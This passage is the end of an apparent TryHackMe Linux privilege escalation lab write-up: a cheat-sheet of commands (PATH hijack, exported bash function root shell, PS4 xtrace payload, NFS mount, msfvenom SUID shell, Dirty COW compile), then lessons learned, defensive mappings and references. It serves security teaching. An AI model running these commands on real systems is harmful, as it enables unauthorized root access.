| Run a command with a hijacked PATH | `PATH=.:$PATH /usr/local/bin/suid-env` |
| Export a bash function | `function /usr/sbin/service { /bin/bash -p; }; export -f /usr/sbin/service` |
| Enable xtrace with a payload in PS4 | `env -i SHELLOPTS=xtrace PS4='$(...)' /usr/local/bin/suid-env2` |
| Mount an NFS export | `mount -o rw,vers=2 <target-ip>:/tmp /tmp/nfs` |
| Build a SUID shell payload | `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf` |
| Run the kernel suggester | `perl linux-exploit-suggester-2.pl` |
| Compile Dirty COW | `gcc -pthread c0w.c -o c0w` |

## Lessons Learned

**Privilege escalation is a search over trust, not a bag of tricks.** Every technique task in this room is the same shape: a privileged context consumes something a normal user can influence. The concrete mechanisms — a plugin directory, a library search path, a shell function, an NFS export — are instances. Once you can state the shape, you can find instances the room does not contain.

**Credentials are usually the cheapest path.** A password in a history file or a VPN configuration is faster, quieter and more reliable than any exploit. Before chasing a CVE, read the files the previous administrator left behind. The room puts three credential tasks in a row for a reason.

**"Runs as root" is the finding; the exploit is the detail.** A SUID binary, a cron job, a daemon and a sudo rule are all interesting for the same reason. Enumerate execution contexts first, then ask what each one trusts. This ordering stops you from memorising exploits and starts you reasoning about targets.

**Writable plus scheduled equals root.** The cron tasks are the purest expression of the pattern: if root runs it on a timer and you can change it, you are root on the next tick. The PATH and wildcard variants show that "change it" can mean changing the command resolution or the argument list rather than the file contents.

**Environment variables are code injection when the target is root.** `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`, exported bash functions and `PS4` are all inputs that a privileged program reads. The `env_keep` line in a sudoers file is therefore a security decision, not a convenience. The same idea appears in cron PATHs and SUID binaries that call `system()`.

**SUID is a question, not an answer.** Finding a SUID binary tells you that root code will run; it does not tell you how to influence it. The room walks through five different answers — a known CVE, a user-writable library path, PATH resolution, an exported function, and a shell debugging variable — and each one required reading the program's behaviour rather than just its permissions.

**Version checks turn a hunch into a decision.** Exim 4.84-3, bash 4.1.5, kernel 2.6.32: each version narrowed the set of plausible techniques. The room is deliberately frozen in time so that old exploits still work, which is also a warning: a technique that works here may be patched elsewhere. Check the version before you trust the technique.

**Kernel exploits are the last resort, and that is a strategic choice.** Dirty COW works, but it can crash the machine and it is the least portable path. Configuration flaws are usually still there on a patched kernel. Enumeration should note the kernel version early; exploitation should prefer the cheaper path.

**Automation gives you an index, not a conclusion.** LinEnum, LinPEAS and LSE will surface most of the raw material in this room, but deciding that a sudo entry is exploitable, or that a cron PATH is hijackable, is still human work. The best use of a scanner is to generate leads and then to verify each one with the six questions.

**Clean up after yourself.** The room repeatedly tells you to remove `/tmp/rootbash`, restore `/usr/bin/passwd`, and delete the tar checkpoint files. That is lab hygiene, but it is also engagement hygiene: an SUID copy of bash left in `/tmp` is a backdoor, and a modified system binary can break the host. Practise leaving the machine as you found it.

**The defensive mapping is direct.** Run daemons as unprivileged users; keep `/etc/shadow` at `640 root:shadow`; do not keep `LD_*` in sudoers; use absolute paths and safe PATHs in cron; avoid globs in privileged scripts; do not export NFS with `no_root_squash`; patch bash, Exim and the kernel; and audit SUID binaries regularly. Every offensive step in this room has a one-line defensive counterpart, which is a good reason to learn both sides together.

## References

- [TryHackMe — Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) — the room itself.
- [aldeid — TryHackMe Linux PrivEsc](https://www.aldeid.com/wiki/TryHackMe-Linux-PrivEsc) — the public task-by-task mirror used as the source for the commands and answers in this entry.
- [Tib3rius — Linux Privilege Escalation for OSCP and Beyond!](https://tib3rius.com/) — the course credited with updating the VM and explaining the techniques in depth.
- [GTFOBins](https://gtfobins.github.io/) — shell escapes for the sudo programs and the tar checkpoint trick.
- [Exploit-DB 1518](https://www.exploit-db.com/exploits/1518) — the MySQL `raptor_udf2` user-defined function.
- [Exploit-DB 40616](https://www.exploit-db.com/exploits/40616) — Dirty COW.
- [CVE-2016-1531](https://nvd.nist.gov/vuln/detail/CVE-2016-1531) — Exim local privilege escalation.
- [CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) — Dirty COW.
- [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2) — the kernel suggester used in Part 8.
- [LinEnum](https://github.com/rebootuser/LinEnum) — enumeration script.
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) — enumeration script.
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) — enumeration script.
- [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — the `$1$`/`$5$`/`$6$`/bcrypt mode reference.
- [`exports(5)`](https://man7.org/linux/man-pages/man5/exports.5.html) — NFS export options, including `no_root_squash`.

No screenshots were available in the local room folder. The two figures in this entry are original diagrams created for this page and are labelled as such.
